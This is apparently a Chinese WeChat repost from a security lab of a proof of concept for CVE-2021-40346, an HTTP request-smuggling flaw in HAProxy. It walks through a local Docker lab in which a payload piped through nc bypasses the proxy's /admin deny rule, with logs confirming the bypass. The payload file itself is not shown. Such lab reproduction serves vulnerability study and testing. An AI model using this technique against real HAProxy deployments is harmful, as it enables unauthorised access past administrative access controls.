#  CVE-2021-40346（HAProxy HTTP 走私）屁噢C

knqyf263  [ Khan安全攻防实验室 ](javascript:void\(0\);)

**Khan安全攻防实验室** ![]()

微信号 KhanCJSH

功能介绍 安全不是一个人，我们来自五湖四海。研究方向Web内网渗透，免杀技术，红蓝攻防对抗，CTF。

____

__

收录于话题

  

  

![](https://gitee.com/fuli009/images/raw/master/public/20210911114224.png)

  

docker启动

  

  *   *   * 

    
    
    $ docker build -t cve-2021-40346 .$ docker run --name poc -p 8000:80 -d --rm -it cve-2021-403464941e9f23508b497e4cbe334a75e7cdb84c83478522ed85f48db3477f97a6fb4

  

  

测试：  

        确认`/admin`被拒绝。  
  

  *   *   *   *   *   * 

    
    
    $ curl http://localhost:8000hello$ curl http://localhost:8000/admin<html><body><h1>403 Forbidden</h1>Request forbidden by administrative rules.</body></html>

  

        你不会`/admin`在日志中看到。这意味着请求没有到达后端服务器，因为 HAProxy 拒绝了它。

  

  *   *   * 

    
    
    $ docker logs pocserver start at port 8000/

  

  

然后，您可以确保它可以被 payload.txt 绕过。

  

  *   *   *   *   *   *   *   *   *   *   * 

    
    
    $ cat payload.txt | nc localhost 8000HTTP/1.1 200 OKcontent-type: text/plaindate: Wed, 08 Sep 2021 22:31:10 GMTkeep-alive: timeout=5transfer-encoding: chunked  
    6hello  
    0

  

  

你会`/admin`在日志中找到。

  

  *   *   *   *   * 

    
    
    $ docker logs pocserver start at port 8000///admin

  

项目地址：  

  

aHR0cHM6Ly9naXRodWIuY29tL2tucXlmMjYzL0NWRS0yMDIxLTQwMzQ2

预览时标签不可点

收录于话题 #

个 __

上一篇 下一篇

阅读

分享 收藏

赞 在看

____已同步到看一看[写下你的想法](javascript:;)

前往“发现”-“看一看”浏览“朋友在看”

![示意图](//res.wx.qq.com/mmbizwap/zh_CN/htmledition/images/pic/appmsg/pic_like_comment55871f.png)

前往看一看

**看一看入口已关闭**

在“设置”-“通用”-“发现页管理”打开“看一看”入口

[我知道了](javascript:;)

__

已发送

取消 __

####  发送到看一看

发送

CVE-2021-40346（HAProxy HTTP 走私）屁噢C

最多200字，当前共字

__

发送中

写下你的留言

微信扫一扫  
关注该公众号

[知道了](javascript:;)

微信扫一扫  
使用小程序

****

[取消](javascript:void\(0\);) [允许](javascript:void\(0\);)

****

[取消](javascript:void\(0\);) [允许](javascript:void\(0\);)

： ， 。 视频 小程序 赞 ，轻点两下取消赞 在看 ，轻点两下取消在看

